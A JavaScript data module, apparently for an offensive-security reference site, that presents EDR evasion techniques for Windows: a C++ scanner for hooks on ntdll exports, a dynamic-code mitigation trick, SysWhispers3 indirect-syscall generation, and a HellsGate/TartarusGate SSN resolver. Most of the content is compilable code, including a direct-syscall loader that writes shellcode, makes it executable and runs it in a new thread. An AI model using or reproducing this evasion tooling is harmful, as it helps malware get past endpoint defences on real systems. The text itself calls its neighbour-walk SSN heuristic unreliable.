export const hookTechniques = [
  {
    id: 'hook-bypass',
    title: 'EDR Hook Detection & Bypass Strategy',
    subtitle: 'Walk ntdll exports to identify JMP-patched hooks and choose the optimal bypass: unhooking, indirect syscalls, or mitigation policy',
    tags: ['EDR hooks', 'inline hooks', 'JMP patch', 'ntdll export walk', '4C 8B D1 B8', 'E9 JMP', 'hook detection', 'unhooking', 'process mitigation policy'],
    accentColor: 'cyan',
    overview: 'EDRs install userland hooks by overwriting the first 5-8 bytes of sensitive ntdll exports (NtAllocateVirtualMemory, NtWriteVirtualMemory, NtCreateThreadEx, etc.) with a JMP to their analysis DLL. When your code calls a hooked function, execution detours through the EDR before reaching the kernel — the EDR inspects arguments, call stack, and context. Detecting which functions are hooked informs the bypass decision: if everything is hooked → unhook all; if targeted → indirect syscalls for those specific functions; kernel-level only (MDE) → unhooking is irrelevant.',
    steps: [
      'Walk ntdll export table — for each Nt* function, read the first 4 bytes and classify the hook type',
      'Clean stub: 4C 8B D1 B8 XX 00 00 00 = MOV R10,RCX; MOV EAX,SSN — intact, no hook',
      'JMP hook: E9 XX XX XX XX = near JMP to EDR analysis code — absolute hook',
      'FF 25 hook: FF 25 XX XX XX XX = indirect JMP via 64-bit pointer — long-range EDR detour',
      'Record all hooked functions — correlate with your planned API usage to determine exposure',
      'Choose bypass: all hooked → load clean ntdll from disk; selective → indirect syscalls per function; no userland hooks (MDE) → ETW/kernel focus',
      'Process Dynamic Code Policy: SetProcessMitigationPolicy(ProcessDynamicCodePolicy) prevents EDR from injecting new hooks, but also blocks your own dynamic code — use carefully',
    ],
    commands: [
      {
        title: 'Full ntdll hook scanner with classification (C++)',
        code: `// hookscanner.cpp — enumerate all ntdll hooks
// Compile: x86_64-w64-mingw32-g++ -O2 -s -o scanner.exe hookscanner.cpp -lkernel32
#include <windows.h>
#include <stdio.h>

void ScanHooks() {
    HMODULE hNtdll=(HMODULE)GetModuleHandleA("ntdll.dll");
    PIMAGE_DOS_HEADER dos=(PIMAGE_DOS_HEADER)hNtdll;
    PIMAGE_NT_HEADERS nt =(PIMAGE_NT_HEADERS)((PBYTE)hNtdll+dos->e_lfanew);
    PIMAGE_EXPORT_DIRECTORY exp=(PIMAGE_EXPORT_DIRECTORY)((PBYTE)hNtdll+
        nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

    PDWORD names   =(PDWORD)((PBYTE)hNtdll+exp->AddressOfNames);
    PDWORD funcs   =(PDWORD)((PBYTE)hNtdll+exp->AddressOfFunctions);
    PWORD  ordinals=(PWORD) ((PBYTE)hNtdll+exp->AddressOfNameOrdinals);

    int hookedCount=0,cleanCount=0;
    for(DWORD i=0;i<exp->NumberOfNames;i++){
        const char* name=(const char*)((PBYTE)hNtdll+names[i]);
        if(name[0]!='N'||name[1]!='t') continue;   // Only Nt* functions

        PBYTE fn=(PBYTE)((PBYTE)hNtdll+funcs[ordinals[i]]);

        if(fn[0]==0x4C&&fn[1]==0x8B&&fn[2]==0xD1&&fn[3]==0xB8){
            // 4C 8B D1 B8 = MOV R10,RCX; MOV EAX,SSN — CLEAN
            DWORD ssn=*(DWORD*)(fn+4);
            printf("[CLEAN]  SSN=%04X  %s\\n",ssn,name);
            cleanCount++;
        } else if(fn[0]==0xE9){
            // E9 = near JMP → EDR hook
            DWORD rel=*(DWORD*)(fn+1);
            PVOID target=(PVOID)((PBYTE)fn+5+(ptrdiff_t)(int)rel);
            printf("[HOOK-JMP]  %-45s → 0x%p\\n",name,target);
            hookedCount++;
        } else if(fn[0]==0xFF&&fn[1]==0x25){
            // FF 25 = indirect JMP → EDR hook (long range)
            printf("[HOOK-IND]  %-45s bytes: %02X %02X %02X %02X %02X\\n",
                name,fn[0],fn[1],fn[2],fn[3],fn[4]);
            hookedCount++;
        } else {
            printf("[UNKNOWN]   %-45s bytes: %02X %02X %02X %02X %02X\\n",
                name,fn[0],fn[1],fn[2],fn[3],fn[4]);
        }
    }
    printf("\\nSummary: %d hooked  %d clean\\n",hookedCount,cleanCount);
    printf("Recommended bypass: %s\\n",
        hookedCount>5?"Unhook all (load clean ntdll from disk)":
        hookedCount>0?"Indirect syscalls for hooked functions":
        "No userland hooks — check ETW-Ti / kernel callbacks (MDE pattern)");
}

int main(){ ScanHooks(); return 0; }`
      },
      {
        title: 'Process Dynamic Code Policy — prevent new hook injection',
        code: `// Block EDR from injecting new userland hooks via ProcessDynamicCodePolicy
// WARNING: also blocks your own dynamic code (VirtualAlloc+RX) — use before shellcode allocation
#include <windows.h>
#include <processthreadsapi.h>

bool SetNoDynamicCode() {
    PROCESS_MITIGATION_DYNAMIC_CODE_POLICY policy = {};
    policy.ProhibitDynamicCode = 1;
    // Once set — cannot be unset; process cannot allocate new executable memory
    BOOL ok = SetProcessMitigationPolicy(ProcessDynamicCodePolicy, &policy, sizeof(policy));
    printf("[%s] Dynamic code policy set\\n", ok?"+" : "-");
    return ok == TRUE;
}

// Better approach: set BEFORE any EDR injection window, on process startup
// Then all subsequent memory operations use pre-allocated RX regions
// EDR cannot install new JMP hooks in this process after policy is set`
      }
    ]
  },

  {
    id: 'syscalls',
    title: 'Direct & Indirect Syscalls',
    subtitle: 'Bypass hooked ntdll stubs by invoking NT functions directly via SSN, using indirect gadgets to produce a clean call stack',
    tags: ['direct syscall', 'indirect syscall', 'SSN', 'SysWhispers3', 'HellsGate', 'TartarusGate', 'HalosGate', 'syscall stub', '0F 05 C3', 'call stack origin'],
    accentColor: 'cyan',
    overview: 'Direct syscalls bypass EDR userland hooks by encoding the System Service Number (SSN) in ASM and executing the syscall instruction directly in the implant\'s .text section — skipping the hooked ntdll stub entirely. The problem: the CPU call stack shows the syscall originated from unbacked memory (the implant), not ntdll — EDRs that validate call stack origin will flag this. Indirect syscalls solve this by jumping into the "syscall; ret" gadget inside ntdll\'s own stub (at ntdll+offset), making the CPU stack show ntdll as the caller at the point of kernel transition. SysWhispers3 auto-generates both variants.',
    steps: [
      'Direct syscalls: hardcode SSN + execute syscall instruction from our binary .text — no ntdll involvement, no hook bypass interaction needed',
      'Stack origin problem: EDR sees syscall coming from non-ntdll address range → red flag',
      'Indirect syscalls: JMP into the "syscall; ret" bytes (0F 05 C3) inside ntdll\'s own stub → stack shows ntdll as caller',
      'SSN resolution at runtime (HellsGate): sort ntdll Nt* exports by address → index = SSN; or read SSN byte from stub at offset 4',
      'TartarusGate: if a stub is hooked (first byte ≠ 4C), walk to adjacent Nt* stubs (SSN±1) until an unhooked one is found, reconstruct target SSN',
      'SysWhispers3: python3 SysWhispers.py --preset all -l msvc --out syscalls → generates .h, .c, .asm with random call stacks',
      'Combine with PPID spoof and stack spoof for full call chain legitimacy',
    ],
    commands: [
      {
        title: 'SysWhispers3 — generate and use indirect syscall stubs',
        code: `# ── Generate syscall stubs (all Nt* functions, MSVC output) ──
git clone https://github.com/klezVirus/SysWhispers3 && cd SysWhispers3
python3 SysWhispers.py --preset all -l msvc --out syscalls
# Generates: syscalls.h  syscalls.c  syscallsstubs.asm

# ── MASM build (Visual Studio) ──
# Add to project: syscalls.h, syscalls.c, syscallsstubs.asm
# In .asm properties: Item Type = Microsoft Macro Assembler

# ── MinGW build ──
nasm -f win64 -o syscalls.obj syscallsstubs.asm    # Or NASM variant
x86_64-w64-mingw32-g++ main.cpp syscalls.c syscalls.obj -o loader.exe -lkernel32

# ── Usage in code ──
#include "syscalls.h"

// These call NT functions directly via syscall instruction (no ntdll hook)
PVOID  addr  = NULL;
SIZE_T size  = 0x1000;
HANDLE hProc = GetCurrentProcess();

// Allocate RW memory via direct syscall
NtAllocateVirtualMemory(hProc, &addr, 0, &size, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
// Write shellcode
NtWriteVirtualMemory(hProc, addr, shellcode, sizeof(shellcode), NULL);
// Change to RX
ULONG old; SIZE_T sz2=size;
NtProtectVirtualMemory(hProc, &addr, &sz2, PAGE_EXECUTE_READ, &old);
// Execute
HANDLE hThread;
NtCreateThreadEx(&hThread,THREAD_ALL_ACCESS,NULL,hProc,(LPTHREAD_START_ROUTINE)addr,NULL,FALSE,0,0,0,NULL);
NtWaitForSingleObject(hThread,FALSE,NULL);`
      },
      {
        title: 'HellsGate + TartarusGate — runtime SSN resolution with hook detection (C)',
        code: `// hellsgate.c — resolve SSNs at runtime, handle hooked stubs
// Compile: x86_64-w64-mingw32-gcc -O2 -s -o hellsgate.exe hellsgate.c -lkernel32
#include <windows.h>
#include <stdio.h>

// Find the syscall; ret gadget in ntdll (0F 05 C3) for indirect syscall
PVOID FindSyscallGadget(HMODULE ntdll, const char* funcName) {
    PBYTE fn=(PBYTE)GetProcAddress(ntdll,funcName);
    if(!fn) return NULL;
    for(int i=0;i<32;i++){
        if(fn[i]==0x0F&&fn[i+1]==0x05&&fn[i+2]==0xC3)  // syscall; ret
            return fn+i;
    }
    return NULL;
}

// Read SSN from stub (offset 4 after 4C 8B D1 B8) or walk neighbors if hooked
DWORD GetSSN(HMODULE ntdll, const char* funcName) {
    PBYTE fn=(PBYTE)GetProcAddress(ntdll,funcName);
    if(!fn) return 0xFFFFFFFF;

    // Clean stub: 4C 8B D1 B8 [SSN 4 bytes]
    if(fn[0]==0x4C&&fn[1]==0x8B&&fn[2]==0xD1&&fn[3]==0xB8)
        return *(DWORD*)(fn+4);

    // Hooked (JMP at start) — TartarusGate: walk adjacent stubs
    // Adjacent Nt functions have SSN ± 1
    // Walk forward until we find a clean stub
    for(int offset=1;offset<10;offset++){
        // Walk to next Nt* function (not a reliable offset — need export sort for production)
        // Simplified: attempt fn+offset*32 as rough heuristic
        PBYTE adj=fn+(offset*32);
        if(adj[0]==0x4C&&adj[1]==0x8B&&adj[2]==0xD1&&adj[3]==0xB8){
            DWORD adjSSN=*(DWORD*)(adj+4);
            printf("[TartarusGate] %s hooked — inferred SSN: %04X\\n",funcName,adjSSN-offset);
            return adjSSN-offset;
        }
    }
    printf("[-] Cannot resolve SSN for %s\\n",funcName);
    return 0xFFFFFFFF;
}

int main(){
    HMODULE ntdll=GetModuleHandleA("ntdll.dll");

    DWORD ssn=GetSSN(ntdll,"NtAllocateVirtualMemory");
    PVOID gadget=FindSyscallGadget(ntdll,"NtAllocateVirtualMemory");
    printf("[+] NtAllocateVirtualMemory: SSN=%04X  gadget=0x%p\\n",ssn,gadget);
    // Use gadget as JMP target for indirect syscall stub:
    // mov r10, rcx; mov eax, SSN; jmp [gadget]
    // Stack shows ntdll as caller — defeats call stack origin checks
    return 0;
}`
      }
    ]
  },
];